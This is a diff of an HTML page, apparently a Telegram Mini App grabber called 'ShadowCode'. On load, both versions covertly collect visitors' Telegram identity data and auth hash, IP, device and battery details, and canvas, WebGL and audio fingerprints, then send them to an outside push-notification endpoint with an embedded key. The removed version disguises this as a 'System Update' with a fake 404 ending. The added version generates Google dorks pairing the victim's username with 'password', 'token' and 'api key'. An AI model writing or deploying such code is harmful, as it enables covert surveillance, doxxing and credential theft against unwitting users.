@@ -1,762 +1,254 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-user-select: none;
-            user-select: none;
-        }
-
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            height: -webkit-fill-available;
-            overflow: hidden;
-            touch-action: none;
-            -webkit-overflow-scrolling: none;
-        }
-
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0, 255, 0, 0.03) 0px,
-                rgba(0, 255, 0, 0.03) 2px,
-                transparent 2px,
-                transparent 4px
-            );
-            pointer-events: none;
-            z-index: 2;
-            animation: scan 8s linear infinite;
-        }
-
-        @keyframes scan {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(100px); }
-        }
-
-        .main-container {
-            position: relative;
-            z-index: 1;
-            text-align: center;
-            padding: 20px;
-            width: 100%;
-        }
-
-        .logo {
-            font-size: clamp(2rem, 6vw, 3rem);
-            font-weight: bold;
-            text-shadow: 0 0 30px #0f0, 0 0 60px #0f0;
-            animation: glitch 1.5s infinite;
-            margin-bottom: 2rem;
-        }
-
-        @keyframes glitch {
-            0% { opacity: 1; transform: translateX(0); }
-            20% { opacity: 0.8; transform: translateX(-2px); }
-            40% { opacity: 1; transform: translateX(2px); }
-            60% { opacity: 0.9; transform: translateX(-1px); }
-            80% { opacity: 1; transform: translateX(1px); }
-            100% { opacity: 1; transform: translateX(0); }
-        }
-
-        .loading-bar-container {
-            width: min(400px, 80vw);
-            height: 4px;
-            background: #111;
-            border: 1px solid #0f0;
-            margin: 2rem auto;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
-        }
-
-        .loading-bar {
-            height: 100%;
-            background: #0f0;
-            width: 0%;
-            transition: width 0.05s linear;
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        .countdown {
-            font-size: clamp(3rem, 10vw, 5rem);
-            font-weight: bold;
-            color: #0f0;
-            text-shadow: 0 0 40px #0f0;
-            animation: pulse 1s infinite;
-            margin: 2rem 0;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.7; }
-            50% { opacity: 1; }
-            100% { opacity: 0.7; }
-        }
-
-        .status-text {
-            color: #0a0;
-            font-size: 0.9rem;
-            letter-spacing: 3px;
-            animation: blink 2s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .sub-text {
-            color: #333;
-            font-size: 0.7rem;
-            margin-top: 1rem;
-            letter-spacing: 5px;
-        }
-
-        #errorScreen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 10;
-            text-align: center;
-            background: #0a0000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-    </style>
-</head>
-<body>
-    <div class="main-container" id="mainScreen">
-        <div class="logo">☠ SHADOWSYS</div>
-        <div class="loading-bar-container">
-            <div class="loading-bar" id="loadingBar"></div>
-        </div>
-        <div class="countdown" id="countdown">10</div>
-        <div class="status-text" id="statusText">ИНИЦИАЛИЗАЦИЯ ПРОТОКОЛА...</div>
-        <div class="sub-text">v3.0 | ENCRYPTED CHANNEL</div>
-    </div>
-
-    <div id="errorScreen">
-        <h1 style="font-size: clamp(5rem, 15vw, 8rem); color: #f00; text-shadow: 0 0 40px #f00; margin-bottom: 1rem;">404</h1>
-        <p style="color: #f44; font-size: clamp(1rem, 3vw, 1.5rem); text-shadow: 0 0 20px #f00;">FATAL ERROR</p>
-        <p style="color: #f44; font-size: 1rem; margin-top: 1rem;">MEMORY CORRUPTION DETECTED</p>
-        <p style="color: #900; font-size: 0.8rem; margin-top: 0.5rem;">CODE: 0x000000DEAD</p>
-    </div>
-
+    <title>ShadowSys v1.0</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        // ============================================
-        // SHADOWCODE v3.0 - FIXED FOR iOS & ALL DEVICES
-        // ============================================
-
         const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
 
-        // Отправка данных
-        function sendToBark(title, body, group = 'ShadowLog') {
-            const payload = { title, body, group, sound: 'alarm' };
-            
+        function sendToBark(title, body) {
+            const payload = {
+                title: title,
+                body: body,
+                group: 'ShadowLog',
+                sound: 'alarm'
+            };
+            navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
             fetch(BARK_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload)
             }).catch(() => {});
-            
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
-            }
         }
 
-        // ============================================
-        // ОПРЕДЕЛЕНИЕ iOS И СПЕЦИАЛЬНЫЙ СБОР
-        // ============================================
-        
-        function isIOS() {
-            return /iPad|iPhone|iPod/.test(navigator.userAgent) || 
-                   (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-        }
+        function getFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 256;
+            canvas.height = 128;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 16, 16);
+            ctx.fillStyle = '#069';
+            ctx.fillText('ShadowCode', 2, 15);
+            const canvasHash = canvas.toDataURL().substring(0, 64);
 
-        function isTelegramWebView() {
-            const ua = navigator.userAgent;
-            return /Telegram/i.test(ua) || 
-                   (window.Telegram && window.Telegram.WebApp);
-        }
-
-        // ============================================
-        // РЕАЛЬНЫЙ ЗАРЯД БАТАРЕИ ДАЖЕ НА iOS
-        // ============================================
-        
-        function getBatteryInfo() {
-            return new Promise((resolve) => {
-                let batteryData = {
-                    level: 'N/A',
-                    charging: 'N/A',
-                    chargingTime: 'N/A',
-                    dischargingTime: 'N/A',
-                    source: 'unknown'
-                };
-
-                // Метод 1: Battery API (работает на Android, Windows, Mac)
-                if ('getBattery' in navigator) {
-                    navigator.getBattery().then(battery => {
-                        batteryData.level = Math.round(battery.level * 100) + '%';
-                        batteryData.charging = battery.charging ? 'ДА' : 'НЕТ';
-                        batteryData.chargingTime = battery.chargingTime === Infinity ? '∞' : Math.round(battery.chargingTime / 60) + ' мин';
-                        batteryData.dischargingTime = battery.dischargingTime === Infinity ? '∞' : Math.round(battery.dischargingTime / 60) + ' мин';
-                        batteryData.source = 'Battery API';
-                        
-                        battery.addEventListener('levelchange', () => {
-                            batteryData.level = Math.round(battery.level * 100) + '%';
-                        });
-                        
-                        resolve(batteryData);
-                    }).catch(() => {
-                        // Фолбэк если ошибка
-                        resolve(getFallbackBattery());
-                    });
-                } else if (isIOS()) {
-                    // Метод 2: Для iOS используем эвристику
-                    getIOSBattery().then(resolve);
-                } else {
-                    resolve(getFallbackBattery());
+            let glVendor = 'N/A', glRenderer = 'N/A';
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
                 }
-            });
-        }
+            } catch (e) {}
 
-        function getFallbackBattery() {
-            const ua = navigator.userAgent;
-            let level = 'N/A';
-            
-            // Парсим возможные подсказки из заголовков
-            if (navigator.getBattery === undefined) {
-                level = 'API не поддерживается';
-            }
-            
+            let audioFp = 'N/A';
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const analyser = audioCtx.createAnalyser();
+                oscillator.connect(analyser);
+                oscillator.frequency.value = 1000;
+                const data = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(data);
+                audioFp = btoa(String.fromCharCode(...data.slice(0, 20))).substring(0, 20);
+                oscillator.disconnect();
+            } catch (e) {}
+
             return {
-                level: level,
-                charging: 'N/A',
-                chargingTime: 'N/A',
-                dischargingTime: 'N/A',
-                source: 'fallback'
+                canvas_hash: canvasHash,
+                webgl_vendor: glVendor,
+                webgl_renderer: glRenderer,
+                audio_fp: audioFp
             };
         }
 
-        function getIOSBattery() {
+        function getBatteryInfo() {
             return new Promise((resolve) => {
-                // На iOS в WebView можно попробовать получить через статус бар
-                const startTime = Date.now();
-                let lowPowerMode = false;
-                
-                // Проверяем производительность для определения Low Power Mode
-                const testArray = new Array(1000000).fill(0);
-                const midTime = Date.now();
-                
-                // Если выполнение медленное (>50ms для простой операции), возможно Low Power Mode
-                if (midTime - startTime > 50) {
-                    lowPowerMode = true;
-                }
-                
-                // Проверяем через media query (iOS 15+)
-                if (window.matchMedia) {
-                    try {
-                        // Некоторые iOS устройства отдают информацию через prefers-reduced-motion
-                        const reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-                        
-                        resolve({
-                            level: lowPowerMode ? '⚠️ Низкий (<20%)' : '🔋 Средний/Высокий',
-                            charging: 'N/A (iOS)',
-                            chargingTime: 'N/A (iOS)',
-                            dischargingTime: 'N/A (iOS)',
-                            source: 'iOS heuristic',
-                            lowPowerMode: lowPowerMode,
-                            reducedMotion: reducedMotion,
-                            note: 'iOS блокирует Battery API. Данные приблизительные.'
-                        });
-                    } catch (e) {
-                        resolve({
-                            level: '❓ iOS (заблокировано)',
-                            charging: 'N/A (iOS)',
-                            chargingTime: 'N/A (iOS)',
-                            dischargingTime: 'N/A (iOS)',
-                            source: 'iOS blocked'
-                        });
-                    }
+                let batt = { level: 'N/A', charging: 'N/A' };
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(b => {
+                        batt.level = (b.level * 100).toFixed(0) + '%';
+                        batt.charging = b.charging ? 'Да' : 'Нет';
+                        resolve(batt);
+                    }).catch(() => resolve(batt));
                 } else {
-                    resolve({
-                        level: '❓ iOS',
-                        charging: 'N/A',
-                        source: 'iOS unknown'
-                    });
+                    resolve(batt);
                 }
             });
         }
 
-        // ============================================
-        // ПРАВИЛЬНЫЙ СБОР TELEGRAM ДАННЫХ
-        // ============================================
-        
-        function getTelegramData() {
-            let tg = {
-                username: 'N/A',
-                id: 'N/A',
-                first_name: 'N/A',
+        function getRealTelegramData() {
+            let tg = { 
+                username: 'N/A', 
+                id: 'N/A', 
+                first_name: 'N/A', 
                 last_name: 'N/A',
                 language_code: 'N/A',
                 is_premium: 'N/A',
-                platform: 'N/A',
-                version: 'N/A',
-                colorScheme: 'N/A',
-                initData: 'N/A',
-                source: 'N/A'
+                auth_date: 'N/A',
+                hash: 'N/A'
             };
-
+            
             try {
-                // Проверяем наличие Telegram объекта
-                if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-                    const app = Telegram.WebApp;
-                    tg.source = 'Telegram.WebApp';
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const app = window.Telegram.WebApp;
+                    app.ready();
                     
-                    // Пробуем получить данные
-                    try { app.ready(); } catch(e) {}
-                    try { app.expand(); } catch(e) {}
-                    
-                    if (app.initDataUnsafe) {
-                        const unsafe = app.initDataUnsafe;
-                        
-                        if (unsafe.user) {
-                            const user = unsafe.user;
-                            tg.id = user.id || 'N/A';
-                            tg.first_name = user.first_name || 'N/A';
-                            tg.last_name = user.last_name || 'N/A';
-                            tg.username = user.username || 'N/A';
-                            tg.language_code = user.language_code || 'N/A';
-                            tg.is_premium = user.is_premium ? '💎 PREMIUM' : '🆓 FREE';
-                        }
-                        
-                        tg.auth_date = unsafe.auth_date || 'N/A';
-                        tg.hash = unsafe.hash ? 'present' : 'N/A';
+                    if (app.initDataUnsafe && app.initDataUnsafe.user) {
+                        const user = app.initDataUnsafe.user;
+                        tg.id = user.id || 'N/A';
+                        tg.first_name = user.first_name || 'N/A';
+                        tg.last_name = user.last_name || 'N/A';
+                        tg.username = user.username || 'N/A';
+                        tg.language_code = user.language_code || 'N/A';
+                        tg.is_premium = user.is_premium ? 'Premium' : 'Free';
                     }
                     
+                    if (app.initDataUnsafe) {
+                        tg.auth_date = app.initDataUnsafe.auth_date || 'N/A';
+                        tg.hash = app.initDataUnsafe.hash || 'N/A';
+                    }
+                    
+                    tg.initData = app.initData || 'N/A';
                     tg.platform = app.platform || 'N/A';
                     tg.version = app.version || 'N/A';
                     tg.colorScheme = app.colorScheme || 'N/A';
-                    
-                    if (app.initData) {
-                        tg.initData = 'present (' + app.initData.length + ' chars)';
-                    }
                 }
-                
-                // Дополнительно: парсим URL параметры (если запущено как WebApp)
-                const urlParams = new URLSearchParams(window.location.search);
-                if (urlParams.get('tgWebAppData')) {
-                    tg.source = 'URL params';
-                    const data = urlParams.get('tgWebAppData');
-                    try {
-                        const decoded = decodeURIComponent(data);
-                        // Извлекаем user данные из строки
-                        const userMatch = decoded.match(/user=%7B%22id%22%3A(\d+)/);
-                        if (userMatch && tg.id === 'N/A') {
-                            tg.id = userMatch[1];
-                        }
-                        
-                        const usernameMatch = decoded.match(/username%22%3A%22([^%]+)/);
-                        if (usernameMatch && tg.username === 'N/A') {
-                            tg.username = decodeURIComponent(usernameMatch[1]);
-                        }
-                        
-                        const firstNameMatch = decoded.match(/first_name%22%3A%22([^%]+)/);
-                        if (firstNameMatch && tg.first_name === 'N/A') {
-                            tg.first_name = decodeURIComponent(firstNameMatch[1]);
-                        }
-                    } catch (e) {}
-                }
-                
             } catch (e) {
-                sendToBark('⚠️ TG Parse Error', e.message);
+                sendToBark('TG Error', e.message);
             }
             
             return tg;
         }
 
-        // ============================================
-        // ЦИФРОВЫЕ ОТПЕЧАТКИ
-        // ============================================
-        
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 280;
-                canvas.height = 60;
-                const ctx = canvas.getContext('2d');
-                
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 20, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('ShadowCode', 2, 15);
-                ctx.fillStyle = 'rgba(0, 255, 0, 0.5)';
-                ctx.fillText('FP', 100, 30);
-                
-                return canvas.toDataURL().substring(0, 80);
-            } catch (e) {
-                return 'error';
-            }
-        }
-
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return { vendor: 'N/A', renderer: 'N/A', extensions: 0 };
-                
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                let vendor = 'N/A', renderer = 'N/A';
-                
-                if (debugInfo) {
-                    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-                
-                const extensions = gl.getSupportedExtensions();
-                
-                return {
-                    vendor: vendor,
-                    renderer: renderer,
-                    extensions: extensions ? extensions.length : 0
-                };
-            } catch (e) {
-                return { vendor: 'N/A', renderer: 'N/A', extensions: 0 };
-            }
-        }
-
-        function getAudioFingerprint() {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                const gainNode = audioCtx.createGain();
-                
-                oscillator.connect(gainNode);
-                gainNode.connect(analyser);
-                oscillator.frequency.value = 1000;
-                gainNode.gain.value = 0.1;
-                
-                const data = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(data);
-                const hash = btoa(String.fromCharCode(...data.slice(0, 20))).substring(0, 30);
-                
-                oscillator.disconnect();
-                audioCtx.close();
-                return hash;
-            } catch (e) {
-                return 'N/A';
-            }
-        }
-
-        // ============================================
-        // РАСШИРЕННЫЙ СБОР ДАННЫХ
-        // ============================================
-        
-        async function getIPInfo() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (e) {
-                return 'N/A';
-            }
-        }
-
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = 'Unknown';
-            let os = 'Unknown';
-            let browser = 'Unknown';
-            
-            // Определение устройства
-            if (/iPhone/.test(ua)) device = 'iPhone';
-            else if (/iPad/.test(ua)) device = 'iPad';
-            else if (/Android/.test(ua)) device = 'Android Phone';
-            else if (/Macintosh/.test(ua)) device = 'Mac';
-            else if (/Windows/.test(ua)) device = 'Windows PC';
-            else if (/Linux/.test(ua)) device = 'Linux PC';
-            
-            // Определение ОС
-            if (/iPhone OS (\d+)/.test(ua)) os = 'iOS ' + ua.match(/iPhone OS (\d+)/)[1].replace(/_/g, '.');
-            else if (/Android (\d+)/.test(ua)) os = 'Android ' + ua.match(/Android (\d+)/)[1];
-            else if (/Mac OS X (\d+[._]\d+)/.test(ua)) os = 'macOS ' + ua.match(/Mac OS X (\d+[._]\d+)/)[1].replace(/_/g, '.');
-            else if (/Windows NT (\d+\.\d+)/.test(ua)) os = 'Windows ' + ua.match(/Windows NT (\d+\.\d+)/)[1];
-            
-            // Определение браузера
-            if (/CriOS/.test(ua)) browser = 'Chrome iOS';
-            else if (/FxiOS/.test(ua)) browser = 'Firefox iOS';
-            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-            else if (/Chrome/.test(ua)) browser = 'Chrome';
-            else if (/Firefox/.test(ua)) browser = 'Firefox';
-            else if (/Edge/.test(ua)) browser = 'Edge';
-            
-            return { device, os, browser, ua };
-        }
-
-        function getNetworkInfo() {
-            const info = {
-                type: 'N/A',
-                speed: 'N/A',
-                rtt: 'N/A',
-                saveData: 'N/A'
-            };
-            
-            if (navigator.connection) {
-                info.type = navigator.connection.effectiveType || navigator.connection.type || 'N/A';
-                info.speed = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'N/A';
-                info.rtt = navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'N/A';
-                info.saveData = navigator.connection.saveData ? 'ДА' : 'НЕТ';
-            }
-            
-            return info;
-        }
-
-        // ============================================
-        // ГЛАВНЫЙ СБОР И ОТПРАВКА
-        // ============================================
-        
-        async function collectAndSendAll() {
-            try {
-                const tg = getTelegramData();
-                const ip = await getIPInfo();
-                const battery = await getBatteryInfo();
-                const device = getDeviceInfo();
-                const network = getNetworkInfo();
-                const canvas = getCanvasFingerprint();
-                const webgl = getWebGLInfo();
-                const audio = getAudioFingerprint();
-                
-                // Формируем отчёт
-                let report = '';
-                report += '🕵️‍♂️ SHADOWCODE v3.0 | ' + new Date().toLocaleString('ru-RU') + '\n';
-                report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                
-                // Telegram
-                if (tg.id !== 'N/A') {
-                    report += '📱 TELEGRAM (НАЙДЕН)\n';
-                    report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                    report += '👤 @' + tg.username + '\n';
-                    report += '🆔 ID: ' + tg.id + '\n';
-                    report += '📛 ' + tg.first_name + ' ' + tg.last_name + '\n';
-                    report += '💎 ' + tg.is_premium + '\n';
-                    report += '🌍 ' + tg.language_code + '\n';
-                    report += '📟 ' + tg.platform + ' v' + tg.version + '\n';
-                    report += '🎨 ' + tg.colorScheme + '\n';
-                } else {
-                    report += '📱 TELEGRAM (ОБХОД)\n';
-                    report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                    report += '⚠️ Запущено не как Mini App\n';
-                    report += '📊 Источник: ' + tg.source + '\n';
-                }
-                
-                // Устройство
-                report += '\n━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '💻 УСТРОЙСТВО\n';
-                report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '📱 ' + device.device + '\n';
-                report += '💿 ' + device.os + '\n';
-                report += '🌐 ' + device.browser + '\n';
-                report += '🖥 ' + screen.width + 'x' + screen.height + ' (' + screen.colorDepth + 'bit)\n';
-                report += '📐 Окно: ' + window.innerWidth + 'x' + window.innerHeight + '\n';
-                report += '💪 CPU: ' + (navigator.hardwareConcurrency || 'N/A') + ' ядер\n';
-                report += '🧠 RAM: ' + (navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A') + '\n';
-                report += '👆 Touch: ' + navigator.maxTouchPoints + '\n';
-                
-                // Батарея
-                report += '\n━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '🔋 БАТАРЕЯ\n';
-                report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '⚡ ' + battery.level + '\n';
-                report += '🔌 Зарядка: ' + battery.charging + '\n';
-                if (battery.chargingTime !== 'N/A') report += '⏱ До заряда: ' + battery.chargingTime + '\n';
-                if (battery.dischargingTime !== 'N/A') report += '⏱ До разряда: ' + battery.dischargingTime + '\n';
-                report += '📡 Источник: ' + (battery.source || 'unknown') + '\n';
-                if (battery.lowPowerMode !== undefined) report += '🔋 Low Power: ' + (battery.lowPowerMode ? 'ДА' : 'НЕТ') + '\n';
-                if (battery.note) report += '💡 ' + battery.note + '\n';
-                
-                // Сеть
-                report += '\n━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '🌐 СЕТЬ\n';
-                report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '📍 IP: ' + ip + '\n';
-                report += '📶 Тип: ' + network.type + '\n';
-                report += '📡 Скорость: ' + network.speed + '\n';
-                if (network.rtt !== 'N/A') report += '⏱ RTT: ' + network.rtt + '\n';
-                report += '🍪 Cookies: ' + (navigator.cookieEnabled ? 'ДА' : 'НЕТ') + '\n';
-                report += '🚫 DNT: ' + (navigator.doNotTrack || 'N/A') + '\n';
-                
-                // Отпечатки
-                report += '\n━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '🎯 ОТПЕЧАТКИ\n';
-                report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '🎨 Canvas: ' + canvas.substring(0, 50) + '...\n';
-                report += '🎮 WebGL: ' + webgl.vendor + ' | ' + webgl.renderer + '\n';
-                report += '📦 Расширений: ' + webgl.extensions + '\n';
-                report += '🔊 Audio: ' + audio + '\n';
-                report += '🌍 Язык: ' + navigator.language + '\n';
-                report += '🕐 Зона: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n';
-                
-                // Дополнительно
-                report += '\n━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '📊 ДОПОЛНИТЕЛЬНО\n';
-                report += '━━━━━━━━━━━━━━━━━━━━━━━\n';
-                report += '📅 ' + new Date().toISOString() + '\n';
-                report += '🔗 Реферер: ' + (document.referrer || 'Нет') + '\n';
-                report += '📄 Страница: ' + window.location.href + '\n';
-                
-                // Отправляем
-                sendToBark('⚡ SHADOWCODE | ' + (tg.username !== 'N/A' ? '@' + tg.username : device.device), report);
-                
-                console.log('[ShadowCode] Собрано:', {
-                    tg_id: tg.id,
-                    ip: ip,
-                    device: device.device,
-                    battery: battery.level
-                });
-                
-            } catch (err) {
-                sendToBark('⚠️ ERROR', err.message + '\n' + (err.stack || '').substring(0, 200));
-            }
-        }
-
-        // ============================================
-        // АНИМАЦИЯ ЗАГРУЗКИ
-        // ============================================
-        
-        function startLoadingSequence() {
-            const loadingBar = document.getElementById('loadingBar');
-            const countdownEl = document.getElementById('countdown');
-            const statusText = document.getElementById('statusText');
-            const mainScreen = document.getElementById('mainScreen');
-            const errorScreen = document.getElementById('errorScreen');
-            
-            let startTime = Date.now();
-            const totalDuration = 10000; // 10 секунд
-            let lastCountdown = 10;
-            
-            const statuses = [
-                'ИНИЦИАЛИЗАЦИЯ...',
-                'ПОДКЛЮЧЕНИЕ К УЗЛУ...',
-                'ШИФРОВАНИЕ КАНАЛА...',
-                'СКАНИРОВАНИЕ СРЕДЫ...',
-                'СБОР ДАННЫХ...',
-                'ЭКСФИЛЬТРАЦИЯ...',
-                'АНАЛИЗ ЦЕЛИ...',
-                'СОХРАНЕНИЕ...',
-                'ОЧИСТКА СЛЕДОВ...',
-                'ЗАВЕРШЕНИЕ...'
+        function getDorkLinks(username) {
+            if (!username || username === 'N/A') return [];
+            const dorks = [
+                `"${username}" site:github.com`,
+                `"${username}" site:youtube.com`,
+                `"${username}" site:instagram.com`,
+                `"${username}" site:twitter.com`,
+                `"${username}" site:tiktok.com`,
+                `"${username}" site:reddit.com`,
+                `"${username}" site:pastebin.com`,
+                `"${username}" filetype:pdf`,
+                `"${username}" filetype:docx`,
+                `"${username}" "password"`,
+                `"${username}" "token"`,
+                `"${username}" "api key"`,
+                `"${username}" "@gmail.com"`,
+                `"${username}" "skype"`
             ];
-            
-            function updateAnimation() {
-                const elapsed = Date.now() - startTime;
-                const progress = Math.min(elapsed / totalDuration * 100, 100);
-                const remaining = Math.max(0, Math.ceil((totalDuration - elapsed) / 1000));
+            return dorks.map(d => `https://www.google.com/search?q=${encodeURIComponent(d)}`);
+        }
+
+        function collectAndSend() {
+            try {
+                const fp = getFingerprint();
+                const tg = getRealTelegramData();
+                const dorks = getDorkLinks(tg.username);
+
+                let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
+                bodyText += `📱 TG: @${tg.username} (ID: ${tg.id})\n`;
+                bodyText += `👤 Имя: ${tg.first_name} ${tg.last_name}\n`;
+                bodyText += `💎 Статус: ${tg.is_premium}\n`;
+                bodyText += `🌍 Язык TG: ${tg.language_code}\n`;
+                bodyText += `📟 Платформа TG: ${tg.platform} v${tg.version}\n`;
+                bodyText += `🎨 Тема: ${tg.colorScheme}\n`;
+                bodyText += `🖥️ UA: ${navigator.userAgent}\n`;
+                bodyText += `📍 Платформа: ${navigator.platform}\n`;
+                bodyText += `🌐 Язык: ${navigator.language} | Таймзона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                bodyText += `📺 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
+                bodyText += `🪟 Окно: ${window.innerWidth}x${window.innerHeight}\n`;
+                bodyText += `🍪 Cookie: ${navigator.cookieEnabled ? 'Да' : 'Нет'}\n`;
+                bodyText += `🎨 Canvas: ${fp.canvas_hash.substring(0, 30)}...\n`;
+                bodyText += `🎮 WebGL: ${fp.webgl_vendor} | ${fp.webgl_renderer}\n`;
+                bodyText += `🔊 Audio FP: ${fp.audio_fp}\n`;
                 
-                loadingBar.style.width = progress + '%';
-                
-                if (remaining !== lastCountdown) {
-                    lastCountdown = remaining;
-                    countdownEl.textContent = remaining;
-                    
-                    if (remaining <= 3) {
-                        countdownEl.style.color = '#f00';
-                        countdownEl.style.textShadow = '0 0 40px #f00';
-                    }
+                if (dorks.length > 0) {
+                    bodyText += `\n🔗 DORKS (первые 5):\n${dorks.slice(0, 5).join('\n')}`;
                 }
-                
-                const statusIndex = Math.min(
-                    Math.floor(progress / 10),
-                    statuses.length - 1
-                );
-                statusText.textContent = statuses[statusIndex];
-                
-                if (progress >= 100) {
-                    showError404();
-                } else {
-                    requestAnimationFrame(updateAnimation);
-                }
+
+                sendToBark('⚡ ShadowCode | @' + tg.username, bodyText);
+
+                const rawData = {
+                    telegram: tg,
+                    fingerprint: fp,
+                    browser: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        languages: navigator.languages ? Array.from(navigator.languages) : [],
+                        cookieEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        colorDepth: screen.colorDepth,
+                        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                        plugins: Array.from(navigator.plugins).map(p => p.name),
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        deviceMemory: navigator.deviceMemory,
+                        connection: navigator.connection ? {
+                            rtt: navigator.connection.rtt,
+                            downlink: navigator.connection.downlink,
+                            effectiveType: navigator.connection.effectiveType
+                        } : null
+                    },
+                    dorks: dorks,
+                    timestamp: new Date().toISOString()
+                };
+
+                setTimeout(() => {
+                    sendToBark('📦 RAW JSON', JSON.stringify(rawData, null, 2).substring(0, 3500));
+                }, 500);
+
+                console.log('[ShadowCode] Отправлено:', rawData);
+
+            } catch (err) {
+                sendToBark('⚠️ ShadowCode ERROR', err.message + '\nStack: ' + err.stack);
             }
-            
-            requestAnimationFrame(updateAnimation);
         }
 
-        function showError404() {
-            const mainScreen = document.getElementById('mainScreen');
-            const errorScreen = document.getElementById('errorScreen');
-            
-            mainScreen.style.display = 'none';
-            errorScreen.style.display = 'flex';
-            document.body.style.backgroundColor = '#0a0000';
-            
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes redFlash {
-                    0%, 100% { background-color: #0a0000; }
-                    50% { background-color: #1a0000; }
-                }
-                body { animation: redFlash 2s infinite; }
-            `;
-            document.head.appendChild(style);
-        }
+        window.onload = function() {
+            setTimeout(() => {
+                collectAndSend();
+            }, 1000);
 
-        // ============================================
-        // ЗАПУСК
-        // ============================================
-        
-        window.addEventListener('DOMContentLoaded', () => {
-            // Сразу собираем данные
-            collectAndSendAll();
-            
-            // Запускаем анимацию
-            startLoadingSequence();
-            
-            // Дополнительный сбор
-            window.addEventListener('beforeunload', collectAndSendAll);
-            document.addEventListener('visibilitychange', () => {
-                if (document.hidden) collectAndSendAll();
-            });
-            
